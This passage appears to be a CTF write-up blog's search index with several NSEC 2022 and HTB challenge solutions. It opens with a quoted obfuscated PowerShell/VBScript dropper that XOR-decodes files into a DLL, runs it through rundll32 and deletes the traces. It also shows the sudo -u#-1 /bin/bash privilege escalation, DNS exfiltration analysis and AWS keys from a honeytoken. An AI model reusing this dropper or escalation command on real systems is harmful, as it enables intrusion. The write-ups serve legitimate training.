[System.IO.File]::ReadAllBytes(((\u0026#39;C:GPH\u0026#39;+\u0026#39;pr\u0026#39;+\u0026#39;og\u0026#39;+\u0026#39;ra\u0026#39;+\u0026#39;mdataG\u0026#39;+\u0026#39;PHwww3.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;WG\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;OL\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;C:Y9Apro\u0026#39;+\u0026#39;gramdat\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;Y\u0026#39;+\u0026#39;9Awww\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}\u0026#34; MM4 = \u0026#34;$b = [System.IO.File]::ReadAllBytes(((\u0026#39;C:GPH\u0026#39;+\u0026#39;pr\u0026#39;+\u0026#39;og\u0026#39;+\u0026#39;ra\u0026#39;+\u0026#39;mdataG\u0026#39;+\u0026#39;PHwww4.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;oN\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;Py\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;G\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;C:Y9Apro\u0026#39;+\u0026#39;gramdat\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;Y\u0026#39;+\u0026#39;9Awww\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}\u0026#34; MM5 = \u0026#34;$b = [System.IO.File]::ReadAllBytes(((\u0026#39;C:GPH\u0026#39;+\u0026#39;pr\u0026#39;+\u0026#39;og\u0026#39;+\u0026#39;ra\u0026#39;+\u0026#39;mdataG\u0026#39;+\u0026#39;PHwww5.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;IE\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;YL\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((\u0026#39;C:Y9Apro\u0026#39;+\u0026#39;gramdat\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;Y\u0026#39;+\u0026#39;9Awww\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}\u0026#34; Set Ran = CreateObject(\u0026#34;wscript.shell\u0026#34;) Ran.Run HH0+MM1,Chr(48) WScript.Sleep(500) Ran.Run HH0+MM2,Chr(48) WScript.Sleep(500) Ran.Run HH0+MM3,Chr(48) WScript.Sleep(500) Ran.Run HH0+MM4,Chr(48) WScript.Sleep(500) Ran.Run HH0+MM5,Chr(48) WScript.Sleep(15000) OK1 = \u0026#34;cmd /c rundll32.exe C:\\ProgramData\\www.dll,ldr\u0026#34; OK2 = \u0026#34;cmd /c del C:\\programdata\\www*\u0026#34; OK3 = \u0026#34;cmd /c del C:\\programdata\\pin*\u0026#34; Ran.Run OK1, Chr(48) WScript.Sleep(1000) Run.Run OK2, Chr(48) Run.Run OK3, Chr(48) Globally, what those two scripts chunk are doing is\ndownload a file from a website save it as wwwN.dll (N from 1 to 5) for each of them, apply a transformation on the data and save the output as www.dll finally execute the exported function named ldr of that www.dll clean everything up Since powershell is using [System.IO.File]::WriteAllBytes to create the www.dll file(s) one after the other, only the last one will be kept to be ran.\nWe can\u0026rsquo;t access those websites, but this is where the pcap comes into play. Looking at the pcap, we can download two of the files : pt.html and vm.html. Those can also be known as www1.dll and www4.dll respectively.\nSomehow, the stream for vm.html was a bit weird, with the time of the packet #40 not being handled nicely. It didn\u0026rsquo;t stop us from exporting the bytes as a file, and now, it\u0026rsquo;s time to spin up a windows machine!\nWe can execute the following two lines individually. I modified the paths so they would point locally instead of into C:\\programdata.\n$b = [System.IO.File]::ReadAllBytes(((\u0026#39;www1.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;gl\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;KO\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;X\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;www\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)} #$b = [System.IO.File]::ReadAllBytes(((\u0026#39;www2.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;pc\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;Au\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;P\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((\u0026#39;www\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)} #$b = [System.IO.File]::ReadAllBytes(((\u0026#39;www3.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;WG\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;OL\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;www\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)} $b = [System.IO.File]::ReadAllBytes(((\u0026#39;www4.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;oN\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;Py\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;G\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;www\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)} #$b = [System.IO.File]::ReadAllBytes(((\u0026#39;www5.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;IE\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;YL\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((\u0026#39;www\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)} Once this is executed, we recover the two functional dlls. Or are they? Trying to run them with rundll32.exe www.dll,ldr gives me an error.\nOh well, anyway, we\u0026rsquo;re probably not meant to run them for real? I got another of my team member to run them, but they both just gave a messagebox asking if we were sure it was the one being ran on the system.\nAt that point, I figured that if it wasn\u0026rsquo;t www1 nor www4 that we needed, I really had to find a way to get the last dll (www5) out of bonus.corporatebusinessmachines.htb. Unless something was missing from the challenge, the pcap really didn\u0026rsquo;t have anything related to it.\nIt took me a while to give up on finding www5.dll, but at some point, there is nothing much we can do with a simple failed dns query\u0026hellip; I finally decided to go to sleep, which was a great idea.\nComing back to it in the morning, I took another look at the two dlls that I had, I started to check what kind of information there was. Using external tools, I could see timestamps, compiler information, sections, and codeview information : Z:\\hackthebox-submissions\\202207-business-ctf-mbcoin\\mbcoin\\mbcoin\\x64\\Release\\mbcoin.pdb.\nThe information looks pretty much the same for both. A bit desperate because reversing isn\u0026rsquo;t my strong suit, I tried to look at the first one (pt/www1) with hexdump -C. I know, I know, that\u0026rsquo;s not reversing, and what hopes could I have to get anything out of it? At least I could then see the messagebox related information that one of my team member was able to get when running the dll.\nI did the same thing with the other dll (vm/www4), and.. I think my team member did a mistake when running both dlls, since in his case, they both gave the Oops message, but that second one is definitely different. Trying to finalize a challenge at 2AM may not be the best idea\u0026hellip;\nAfter telling my team member, he tried again, and voilà\u0026hellip;. :D\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022/portobello-depression/","title":"Portobello - Depression","tags":[],"description":"","content":"Challenge statement:\nWhat do you want again? Don’t you think you’ve caused enough harm to the company already? Cyber security is only an expense. You can’t profit from being secure. It is a money drain. Our AI-based deep packet inspection appliance is guaranteed to prevent theft from the Mycoverse. There is nothing left to uncover from the network traffic of the DNS server, I swear. DNS is a safe protocol when you stick to ASCII characters and our appliance only supports this encoding. Even if someone can infiltrate the Mycoverse, there is no way that they can get our intelectual property out of the network. 🚩 This is making me think 🤔 Are the DNS queries made by our users only in ASCII? Rosie Meyer - A+, Server+, CCNA, CCNP, CCIE, MSDST, CSM Network Admin We still need to download the same pcap.\nThrough the pcap, we can see some interesting queries being made that start with xn\u0026ndash;. This type of encoding is named punycode and allows us to use unicode in places where you usually can\u0026rsquo;t.\nWe can use an online converter to get the unicode character out of them.\nTo get a better look, we can filter only for the IP making those queries, fd00:6e73:6563:3232::9 and only for DNS queries of type CNAME.\nDoing the first few by hand, we get to the fifth one and find something that could look like the start of a flag.\nWe now had to figure out which country each flag was, and replace the flags with the county\u0026rsquo;s code from the unicode character. An easy way that I used was to paste them in discord, and hovering with the mouse to get the emoji\u0026rsquo;s name. That way, we get most of the flag:\nFLAG-ART-SCRE??SH??-IS-??GITAL-TH??T\nWe\u0026rsquo;re missing a few flags, but we can guess the rest\nFLAG-ART-SCREENSHOT-IS-DIGITAL-THEFT\nFlag submission:\nPortobello 53 - Depression (1/3) | 2 | The Mycoverse needs it’s own flag (1/3) Forum message:\nThe user found a way to exfiltrate informations using country flags? Where can I get a certification for this? After that, I kept going and reading the other domains. It was pretty fun and got some like that one:\nI did a dozen or two by hand, and this is what I got:\nAt that point, that last line, I knew what it was\u0026hellip; \u0026ldquo;UPLOAD START\u0026rdquo;\u0026hellip; and no, I didn\u0026rsquo;t want to keep doing it by hand. There was a total of 1223 packets that were containing a punycode CNAME\u0026hellip;.\nTime to bring out bash once again:\ntshark -r portobello53.pcapng | grep libera | grep \u0026#34;query 0x\u0026#34; | awk {\u0026#39;print $12\u0026#39;} Sending them all in a file, we can use this Punycode Converter to do more than one at a time. Loading the file with \u0026ldquo;Import Urls\u0026rdquo; and selecting \u0026ldquo;Punycode to IDN\u0026rdquo;. Scrolling down, we can start to see some form that are letters. Here\u0026rsquo;s the first one:\nBy zooming the way down to 25% we can get a better view.\nBy the way, the mushroom at the start are now very nice looking!# We can keep reading the flag, as such:\nWe then end up with:\nFLAG-ART-MUSHROOM-ARE-HIDDEN-IN-PLAIN-SIGHT\nFlag submission:\nPortobello 53 - Depression (2/3) | 1 | Is a VFT screenshot actually art theft? (2/3) Forum message:\nUsers are stealing artwork and VFTs from the Mycoverse. I need to tell the cyberpolice. At the absolute end, we get those:\nThat last command is SLEEP, but before that, we can see a nice QR Code. I say nice, but trying to read it using 5 to 10 tools, including my phone, were all unsuccessful.\nKnowing that the first thing the readers need to parse a QR Code is to recognize the Finder Patterns, and the Alignment Pattern. I did a quick and dirty work in Pinta to make sure those were clear enough:\nWith those modifications, my phone was able to read it and give me the last flag.\nFLAG-ART-EXFIL-METHOD-IS-TRUE-MASTERPIECE\nFlag submission:\nPortobello 53 - Depression (3/3) | 3 | Why invest in YRR when their art can be stolen that easily? Good grief. (3/3) Forum message:\nThat is another level of obfuscation that our AI-based appliance was not ready to deal with. "},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/warmup-challenge-logically/","title":"Warmup challenge, logically","tags":[],"description":"","content":"Challenge statement:\nHere is a pulseview (sigrok) logic capture of some universal asynchronous flags; at least 9600 of them per second 😉 ⚠️ : This challenge has a BONUS FLAG. Flag format: FLAG-{ } Once we download the file, we get a zip archive named warmup_flag_logicaly.sr. Searching for Pulseview Sigrok we end up on the sigrok project, where we can download a tool to analyze that file.\nAfter making that AppImage executable, we can open the file and see 8 digital channels and one analog.\nWe can see information on channel 1 and 2, so we\u0026rsquo;ll start by concentrating on that. After watching a few videos, reading more about the channels and decoders, and trying a few, we can add the proper protocol decoder, which is the Universal Asynchronous Receiver/Transmiter, or UART. A big hint was given in the challenge statement that should have been picked up earlier.\nWe can set the RX and the TX as D1 and D2 respectively, and changing the Baud rate to 9600 like the challenge is saying. After zooming in greatly, we can start seeing data showing up.\nOpening the Binary Decoder Output View, we can see the result of the UART decoder.\nWe can see that each block starts with 0xACFE and ends with 0x7D or 0x7DF0. 0x7D is the closing curly bracket \u0026ldquo;}\u0026rdquo;. We can right click on the \u0026ldquo;UART: RX data\u0026rdquo; line in our graph to export all annotations for this row.\nNow, with a bit of bash-fu, we can line them up.\nwhile read -r line; do echo $line | xxd -r -p; echo; done \u0026lt; \u0026lt;(grep -v bit rx_annotations | awk \u0026#39;{print $5}\u0026#39; | sed \u0026#39;:a;N;$!ba;s/\\n//g\u0026#39; | sed \u0026#39;s/F0ACFE/\\n/g;s/ACFE/\\n/g\u0026#39;) nsechype!\nSo we can see that all the lines are saying the same thing. The text almost fit the flag format, with the normal four letter prefix, curly bracket and content, but the letters at the front are wrong. It could be multiple thing, but with such a short text, and no more hints, we need to test if it is a Caasar Cypher. We can try it on the dcode.fr site and brute force all 26 possibilities. From the result, we can see that it was a very specific substitution cypher: rot13.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022/portobello-bargaining/","title":"Portobello - Bargaining","tags":[],"description":"","content":"Challenge statement:\nWhile you were wasting your time on the DNS server trafic, I had Dr Harold Moon, our resident data scientist, verify if he could find anything out of the ordinary. He’s not an expert and has no active certifications under his name but he wanted you to know that the host at address fd00:6e73:6563:3232::23 was the only one presenting anomalies. I am not a data scientist and have no idea what anomalies are. It’s probably benign because the AI-backed deep packet inspection appliance did not flag anything. Dr Moon said he observed a lot of unusual “back and forth” with this address. No appliance alert = not suspicious in my book. Rosie Meyer - A+, Server+, CCNA, CCNP, CCIE, MSDST, CSM Network Admin We still need to download the same pcap.\nWe can start by filtering the same way we did in Denial, but with the right IP address (fd00:6e73:6563:3232::23).\nWe can see some interesting calls make, like packet 1053, where the query has the word \u0026ldquo;echo\u0026rdquo; in it. The subdomain to echo also look like a string we should be able to convert.\n0.7666742d7365637572652d7661756c742e7972722e636f7270.echo.474f415453.wpad.ctf The second section 7666742d7365637572652d7661756c742e7972722e636f7270 can be translated to vft-secure-vault.yrr.corp and the fourth one 474f415453 to GOATS. That one appears in every interesting request.\nWe can keep going by hand and finding other packets, like 1522, where the second value translate to rosie.meyer, but we should do it with some kind of script, else it will take a long time.\ntshark -r portobello53.pcapng | grep wpad.ctf | grep \u0026#34;query 0x\u0026#34; | awk {\u0026#39;print $12\u0026#39;} | grep echo | cut -d. -f2 | xxd -r -p We can find out first flag in the middle, right after the wallet\u0026rsquo;s private key.\nflag-blockchaiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiin\nIt was actually the second flag, or the third one\u0026hellip; I think there was a little issue with the numbering on that one.\nFlag submission:\nPortobello 53 - Bargaining (3/3) | 2 | Losing this private key is not looking great (2/3) I didn\u0026rsquo;t go check the forums before finding the next flag, but there was a new message hinting us on how to do the last one.\nForum message:\nOur AI appliance was supposed to catch anything malicious and yet it let the private key to our wallet get leaked. This is bad for the company. Can you also tell me which CVE was used to do priviledge escalation? I want to get ready to blame someone else. Use this format: flag-bargaining_{MD5 hash of the string CVE-XXXX-YYYYYYYYYY} (without the {}). For the first flag, I kept looking into wireshark and ended up around packet 2218 where we can clearly see some data in the hexadecimal reprensentation.\nTaking that packet and the next ones together, we can recreate the flag.\nFLAG-we_have_a_bad_case_of_ophiocordyceps_unilateralis\nFlag submission:\nPortobello 53 - Bargaining (1/3) | 2 | Why is that server returning commands? (1/3) Forum message:\nThe DNS server is definitely sending commands to the host. What could go wrong? For the last flag, we had to find the message on the forum. We can see from other packets that we see a query to get the version of sudo, and an execution of sudo -u#-1 /bin/bash. Looking for that specific version of sudo that we got earlier (1.8.27), lead us to an exploit-db page informing us of the CVE : 2019-14287.\nWe can use md5sum to generate the hash and submit our last flag.\nflag-bargaining_739d80f289f091f1d5faf12cfd25fe83\nFlag submission:\nPortobello 53 - Bargaining (2/3) | 1 | A yes, a good old MITRE ATT@CK T1548. Give us ways to cope on grief. (3/3) Forum message:\nSomeone logged in as myself and managed to escalate their priviledges. Don’t tell the news. "},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/the-flag-is-a-secret/","title":"The Flag Is A Secret","tags":[],"description":"","content":"Challenge statement:\nDylan got his hands on some sensitive source code. Watch his video above to find out why he needs your help... 🔗https://security.love/nsctfmc/hello.txt After downloading the hello.txt file, we can see that it\u0026rsquo;s a base64 blob.\nWe can convert it using cat hello.txt | base64 -d \u0026gt; hello.file.\nThen we can use the file utility to get an idea of what it is.\n$ file hello.file hello.file: Zip archive data, at least v1.0 to extract $ unzip hello.zip Archive: hello.file creating: repo/ creating: repo/.git/ inflating: repo/.git/config creating: repo/.git/objects/ creating: repo/.git/objects/pack/ inflating: repo/.git/objects/pack/pack-eaff52f56b425e5b5ac21716b9d9fdb56e6b2c7a.pack creating: repo/.git/objects/info/ extracting: repo/.git/objects/info/packs extracting: repo/.git/HEAD creating: repo/.git/info/ inflating: repo/.git/info/exclude inflating: repo/.git/info/refs creating: repo/.git/logs/ inflating: repo/.git/logs/HEAD creating: repo/.git/logs/refs/ creating: repo/.git/logs/refs/heads/ inflating: repo/.git/logs/refs/heads/master inflating: repo/.git/description creating: repo/.git/hooks/ inflating: repo/.git/hooks/commit-msg.sample inflating: repo/.git/hooks/pre-rebase.sample inflating: repo/.git/hooks/pre-commit.sample inflating: repo/.git/hooks/applypatch-msg.sample inflating: repo/.git/hooks/fsmonitor-watchman.sample inflating: repo/.git/hooks/pre-receive.sample inflating: repo/.git/hooks/prepare-commit-msg.sample inflating: repo/.git/hooks/post-update.sample inflating: repo/.git/hooks/pre-applypatch.sample inflating: repo/.git/hooks/pre-push.sample inflating: repo/.git/hooks/update.sample creating: repo/.git/refs/ creating: repo/.git/refs/heads/ creating: repo/.git/refs/tags/ extracting: repo/.git/index inflating: repo/.git/packed-refs extracting: repo/.git/COMMIT_EDITMSG We can see the packed object that is not usually in a clean repository. The repository is also not reacting normally :\n$ git log fatal: bad object HEAD $ cat objects/pack/pack-eaff52f56b425e5b5ac21716b9d9fdb56e6b2c7a.pack | git unpack-objects Unpacking objects: 100% (11/11), 981 bytes | 981.00 KiB/s, done. objects ├── 13 │ └── 371d7a0caf60d080d2f9196785694736cb926c ├── 29 │ └── 4b2a22f4beaaf42446c64f50d46e023e420164 ├── 2b │ └── 1ab12f55009cd98c2250e3e1dbe8777644b740 ├── 2c │ └── cd75ee92dddff522871ce4ebedd02aed08ba97 ├── 3c │ └── a4066edd31c5d9b8e6857073685e0cbd6680cd ├── 41 │ └── f7e66043fabb8280cb8fc13df101b080364ad2 ├── 48 │ └── bda2b5df64b379731f0e78f4aca7c5e132b716 ├── 4b │ └── 825dc642cb6eb9a060e54bf8d69288fbee4904 ├── 79 │ └── 1c0676fa6f9767ed44d0300973ab51bb9dd668 ├── 8e │ └── f2fc432808c80ae5e95cd485e2de858c69a839 └── a8 └── fe3389a1d422e1c621b52b67b7aefabe862dd5 Simply using the following could give us the full file, but we got lucky since we did not have to compute diffs between commits :\n$ cat pack/pack-eaff52f56b425e5b5ac21716b9d9fdb56e6b2c7a.pack | git cat-file --batch --batch-all-objects [...] 2ccd75ee92dddff522871ce4ebedd02aed08ba97 blob 16 No flag here... 3ca4066edd31c5d9b8e6857073685e0cbd6680cd blob 151 [default] aws_access_key_id = AKIAYVP4CIPPPFRDPNGX aws_secret_access_key = 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 output = json region = us-east-2 41f7e66043fabb8280cb8fc13df101b080364ad2 blob 46 hey, this is the flag file, where\u0026#39;s the flag? [...] Once we called git unpack-objects, the repository became functional and allows us to checkout the different commits or do git diffs to see the different modifications. The file was not modified over time, so the git cat-file was sufficient to give us the aws configuration.\n[default] aws_access_key_id = AKIAYVP4CIPPPFRDPNGX aws_secret_access_key = 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 output = json region = us-east-2 curl \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; unzip awscliv2.zip sudo ./aws/install $ AWS_CONFIG_FILE=aws.config aws sts get-caller-identity { \u0026#34;UserId\u0026#34;: \u0026#34;AIDAYVP4CIPPFFVW4CXJG\u0026#34;, \u0026#34;Account\u0026#34;: \u0026#34;595918472158\u0026#34;, \u0026#34;Arn\u0026#34;: \u0026#34;arn:aws:iam::595918472158:user/canarytokens.com@@efklxdafbz2t6lcpp66bj8c61\u0026#34; } $ AWS_CONFIG_FILE=aws.config aws s3 ls An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied https://www.filestash.app/s3-browser.html\nAfter more than one hour of trying to use multiple tools to figure out which access we have using those credentials, I gave up and sent in the secret access key \u0026ldquo;qa26OSZwBYzHzeOOQZHTYZaNPOzcGT9EnZUoq44c\u0026rdquo;. That was the flag.\nIf the challenge went ahead with the AWS credentials, instead of being a honeytoken, we could use the Pacu tool to learn more about our permissions.\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022/portobello-anger/","title":"Portobello - Anger","tags":[],"description":"","content":"Challenge statement:\nYOU HAVE NO RIGHTS TO USE THE DNS PROTOCOL MALICIOUSLY. Respect the RFCs spirit like any good technology user would. Our vendor guaranteed us that nothing could get stolen from the Mycoverse and I still believe him. Because any data leaving or entering the Mycoverse goes through our AI-backed deep packet inspection appliance, we have never had any user misuse our technologies. They have no need to do so because anything a user would want is acquireable through our online store. My AI appliance alerted me numerous time about large DNS responses from a single domain name but I deleted these alerts as false positives. I don’t want to sound like a broken record but we both know that DNS is a benign protocol. You can still try to find the traffic, I bet it is still happening. Rosie Meyer - A+, Server+, CCNA, CCNP, CCIE, MSDST, CSM Network Admin We still need to download the same pcap.\nThe large DNS responses that the challenge statement is talking about can be found in the TXT records. We can see a lot of query and responses for TXT records in the why-pay-for-bits-when-you-can-drop-the-beats.ctf.\nTaking the first one, we can see that the content of the TXT response look like a base64 blob.\nWe can use base64 to get some clear-ish text:\necho \u0026#34;SUQzAwAAAAABFFRQRTEAAAAQAAAAUzNSTCBmdCBLcnlzdGFsVElUMgAAABYAAABUcmlwcGluZyBvbiBNdXNocm9vbXNDT01NAAAAIwAAAAAAAABmbGFnLXJhZGlvLW15Y292ZXJzZS1pcy1hLXNjYW1DT01NAAAAIwAAAFhYWABmbGFnLXJhZGlvLW15Y292ZXJzZS1pcy1hLXNjYW3/+5REAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; | base64 -d ID3TPE1S3RL ft KrystalTIT2Tripping on MushroomsCOMM#flag-radio-mycoverse-is-a-scamCOMM#XXXflag-radio-mycoverse-is-a-scam���D We can see the first flag in there.\nflag-radio-mycoverse-is-a-scam\nFlag submission:\nPortobello 53 - Anger (1/2) | 1 | This user did not buy this art on the Mycoverse (1/2) Forum message:\nWhat is that user downloading illegaly from a non-official server? We can see that the previous blob was binary, and started with ID3. We can have a better look at it by sending it to hexdump -C:\nID3 is a metadata container usually used in MP3. We can try to extract all the TXT record and create a single file out of them with this script:\nfrom scapy.all import * import base64 raw = sniff(offline=\u0026#34;portobello53.pcapng\u0026#34;) data = b\u0026#39;\u0026#39; for packet in raw: if packet[IPv6].src == \u0026#39;fd00:6e73:6563:3232::100\u0026#39; and b\u0026#39;why-pay-for-bits-when-you-can-drop-the-beats\u0026#39; in packet[DNS].qd.qname and packet[DNS].ancount \u0026gt; 0: data = data + packet[DNS].an.rdata[0] with open(\u0026#39;output\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(base64.b64decode(data)) We can now use the file command to make sure what type of file it is:\n$ file output output: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 128 kbps, 48 kHz, JntStereo It\u0026rsquo;s a bit hard to hear correctly, but when opening the file in an audio player, we can hear the last flag (SOUND WARNING).\nflag-radiocashmoneymushroom247\nFlag submission:\nPortobello 53 - Anger (2/2) | 2 | When the beat drops, expect the stocks to do the same. This gives me grief. (2/2) Forum message:\nListening to pirated radio channel from within the Mycoverse. I will let Eva and Anatoli know that we are missing out on profit. "},{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/toque-tracking/","title":"Toque Tracking","tags":[],"description":"","content":"Challenge statement:\nThe Toqué Restaurant Team is beside themselves... someone appears to have highjacked the restaurant\u0026#39;s Google account along with their website 